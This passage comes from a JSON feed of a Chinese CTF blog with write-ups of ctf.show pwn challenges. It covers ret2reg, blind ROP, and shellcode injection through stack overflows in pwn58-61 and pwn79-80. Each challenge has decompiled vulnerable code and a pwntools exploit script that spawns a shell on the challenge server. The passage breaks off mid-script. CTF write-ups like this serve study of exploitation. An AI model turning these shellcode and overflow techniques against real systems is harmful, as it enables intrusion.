id=\"pwn79ret2reg\"><a class=\"anchor\" href=\"#pwn79ret2reg\">#</a> pwn79（ret2reg）</h1>\n<p>ret2reg: 这个方法是在 ret 之前有寄存器保存了 shellcode 的地址时，可以通过 <code>call\\jmp</code>  命令来跳转到对于地址，(如 <code>jmp eax</code> ,eax 保存了 <code>shellcode</code>  的地址)</p>\n<h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目</h2>\n<p>题目描述： <code>你需要注意某些函数，这是解题的关键！</code></p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\nRWX:      Has RWX segments\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> input<span class=\"token punctuation\">[</span><span class=\"token number\">512</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-808h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+800h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your input: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>input<span class=\"token punctuation\">,</span> <span class=\"token number\">2048</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __cdecl <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">512</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-208h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里可以先在 main 函数写 2048（0x800）字节的内容，在 ctfshow 函数会将这个内容复制到一个 0x200 大小的数组，那么就可以导致溢出</p>\n<p>这里没有开启 NX，所以可以写入 shellcode，但是我们要考虑如何跳转到 shellcode 的地址，这里就利用 ret2reg 来实现：</p>\n<p>在 <code>ctfshow</code>  内的 <code>leave</code>  命令出下个断点：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%28X%24X527MI7%7DMIPM_WG30VDU.png\" alt=\"\" /></p>\n<p>执行输入 <code>wsnd</code> : 可以看见在 leave 命令处 <code>eax、ecx、edx</code>  寄存器都保存了字符串的地址<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/KSGKKS3D1%7D44%24%7DJ%40%2412V%28AL.png\" alt=\"\" /></p>\n<p>利用溢出将 ret 覆盖为 <code>call eax</code>  或者 <code>jmp eax</code>  之类的，能跳转到输入字符串地址即可</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/OI3%25%25NS5K5%28J%7D%7EC15H1%29S30.png\" alt=\"\" /></p>\n<p>最终就是先写入 <code>shellcode</code> ，然后用  <code>call edx</code>  覆盖 <code>ret</code>  达到执行 <code>shellcode</code>  的目的【这里一开始认为 <code>call edx</code>  和 <code>call eax</code>  两个都可以，但是实际执行起来 edx 的并不行，调试执行完 ret 也没有发现修改 edx 的内容...】</p>\n<h1 id=\"pwn80-盲打rop循环爆破\"><a class=\"anchor\" href=\"#pwn80-盲打rop循环爆破\">#</a> pwn80 (盲打 rop，循环爆破)</h1>\n<h2 id=\"题目-12\"><a class=\"anchor\" href=\"#题目-12\">#</a> 题目</h2>\n<p>题目描述： <code>盲打 blind rop （不是忘记放附件，是本身就没附件！！！）</code></p>\n<p>盲打。。，nc 连接</p>\n<p>【盲打 rop 的知识】<span class=\"exturl\" data-url=\"aHR0cHM6Ly93b295dW4uanMub3JnL2Ryb3BzL0JsaW5kJTIwUmV0dXJuJTIwT3JpZW50ZWQlMjBQcm9ncmFtbWluZyUyMChCUk9QKSUyMEF0dGFjayUyMC0lMjAlRTYlOTQlQkIlRTUlODclQkIlRTUlOEUlOUYlRTclOTAlODYuaHRtbA==\">https://wooyun.js.org/drops/Blind Return Oriented Programming (BROP) Attack - 攻击原理.html</span></p>\n<p><code>buf：</code></p>\n<p>测试 buf 的大小，可以通过循环输入不断变长的字符串，每次 <code>长度加一</code> ，直到后面导致 <code>程序崩溃</code> ，程序产生崩溃时的长度 <code>减1</code>  就是 buf 的长度【通过这种方式也可逐个字节的爆破 <code>canary</code> ，因为第一个字节与程序的 <code>canary</code>  相同时程序并不会崩溃，所以爆破一个字节有 256 种可能，8 个字节就是 <code>8*256</code> ，爆破难度并不大，而爆破完后 <code>没有</code> 一次成功的即是 <code>没有开启canary</code> 】</p>\n<p><code>stop_gadget:</code></p>\n<p>该 gadget 是不会使程序崩溃，使程序会返回到 main（或者其他已经执行了的函数）再次执行，导致产生一次循环，只要利用该地址覆盖 ret，判断其返回内容是否是循环执行了程序即可找到</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/KN6G%5DIVZ_H%60ESI%25ZI171K%5BS.png\" alt=\"\" /></p>\n<p>use_rop:</p>\n<p>一个带有 ret 的 rop，可以时我们跳转到其他地方，想要找出来需要使其覆盖 ret 的地址，已经覆盖后面的地址为 <code>stop_gadget</code> ，然后执行的时候跳转到 <code>stop_gadget</code>  这样程序也不会崩溃，从而可以知道这是 <code>use_rop</code> 【但是这还有可能是找到了一个 <code>stop_gadget</code> 】</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/R4%7DL2R%409%5B8%7BUXEW6%29E8IG%25S.png\" alt=\"\" /></p>\n<p><code>brop：</code></p>\n<p>brop 是一个带有所有寄存器的 rop： <code>rdi rsi rdx rcx r8 r9 ret</code></p>\n<p>这可以是我们进行任意的传参，找到它的方法与 <code>use_rop</code>  类似，只不过需要利用 <code>crash_add</code>  来填充 ret 后的 6 个地址，再用 <code>stop_gadget</code>  填充一个地址，这样使得再没有崩溃反而循环回去了情况产生时就会是我们需要的 <code>brop</code>  导致的</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/S%24ZNF%5DXJ8H9QN%288%7D%24ZCZLPL.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/",
            "url": "https://vvwwvv.cn/2023/10/21/pwn/%E5%88%B7%E9%A2%98/ctfshow/58-68/",
            "title": "CTFshow(栈溢出部分,58~68)",
            "date_published": "2023-10-21T03:01:15.000Z",
            "content_html": "<h1 id=\"有所收获的题目\"><a class=\"anchor\" href=\"#有所收获的题目\">#</a> 有所收获的题目：</h1>\n<p>pwn66 (shellcode 开头为 <code>\\x00</code> )</p>\n<p>pwn67 （32 位 nop sled  -&gt;shellcode）</p>\n<h1 id=\"pwn58shellcode\"><a class=\"anchor\" href=\"#pwn58shellcode\">#</a> pwn58(shellcode)</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p>题目描述： <code>32位 无限制</code></p>\n<p>32 位程序，开启保护：</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\nRWX:      Has RWX segments\n</code></pre>\n<p>有可执行段</p>\n<p>main（反编译未成功）:</p>\n<p>这里提示 shellcode，然后执行了一个 ctfshow 函数<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%40%7B_%7B1Q%25K6V28H7G2%7DEVF%5DAQ.png\" alt=\"\" /></p>\n<p><code>ctfshow：</code></p>\n<pre><code>int __cdecl ctfshow(char *s)\n&#123;\n  gets(s);\n  return puts(s);\n&#125;\n</code></pre>\n<p>一个 gets 函数，有可执行段，且没有开启 nx, 直接在栈上写入 shellcode，然后返回执行</p>\n<p>这里看汇编发现 main 函数有个 <code>call eax</code></p>\n<p>gets 函数的参数地址是从主函数传参进去的，在 eax 中，后面 call eax，就直接执行了 eax，也就相当于执行了 shellcode</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%5D%5DMB2%403N833NJ5E3Z8J%7EQCO.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28135</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload1<span class=\"token operator\">=</span>shellcode</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn59shellcode\"><a class=\"anchor\" href=\"#pwn59shellcode\">#</a> pwn59(shellcode)</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p>题目描述： <code>64位 无限制</code></p>\n<p>64 位程序，没有 nx</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre>\n<p>与上一题相同，仍然是一个 gets 函数， <code>call rdx</code></p>\n<p>利用 64 位 shellcode 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28127</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span>shellcode</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn60shellcode\"><a class=\"anchor\" href=\"#pwn60shellcode\">#</a> pwn60(shellcode)</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p>题目内容： <code>入门难度shellcode</code></p>\n<p>32 位程序，没有开启 NX</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\nRWX:      Has RWX segments\n</code></pre>\n<p><code>main:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CTFshow-pwn can u pwn me here!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x64u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"See you ~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里会将 gets 的函数复制到 buf2，buf2 在 bss 段，查看一下可执行权限：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IWAF%7DG%40%29%5B5%40%40E%24%7D0SVMM4EW.png\" alt=\"\" /></p>\n<p>居然没有可执行权限....</p>\n<p>查看 wp 后发现，用 ubuntu18.02 发现有执行权限...</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/N316WRCUO1533QCK8HZXZ%7EW.png\" alt=\"\" /></p>\n<p>然后输入 shellcode，再溢出返回到 buf2 即可执行</p>\n<p>偏移为 112,ida 好像有误：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/OBB%5DLLRU%2863%7BRH%60JZ14%5B_2O.png\" alt=\"\" /></p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28244</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>buf2<span class=\"token operator\">=</span><span class=\"token number\">0x804A080</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"me here!!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload1<span class=\"token operator\">=</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">112</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn61shellcode\"><a class=\"anchor\" href=\"#pwn61shellcode\">#</a> pwn61(shellcode)</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目：</h2>\n<p>题目描述： <code>输出了什么？</code></p>\n<p>64 位程序：</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      PIE enabled\nRWX:      Has RWX segments\n</code></pre>\n<p>可以看到开启了 pie, 地址都进行了改变</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FILE <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 v5<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v5<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> _bss_start<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to CTFshow!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this : [%p] ?\\n\"</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Maybe it's useful ! But how to use it?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里打印了 v5 的栈地址，没有开启 nx，可以写入 shellcode 然后返回到 v5 执行</p>\n<p><s>可以写入的 shellcode 为 0x10+8（24 字节）</s></p>\n<p>这里不能直接写 shellcode 进入栈内，因为后面会执行 leave 命令，会导致重置，那么就无法执行 shellcode，需要溢出写到栈的后面</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/NF3P8%5D%24H%29K%60%7DJ%294M%5BOIY%5B%5DS.png\" alt=\"\" /></p>\n<p>所以栈内的 24 字节无法使用，溢出到后面即可，返回地址要 <code>栈地址+32(24+ret的8字节)</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span 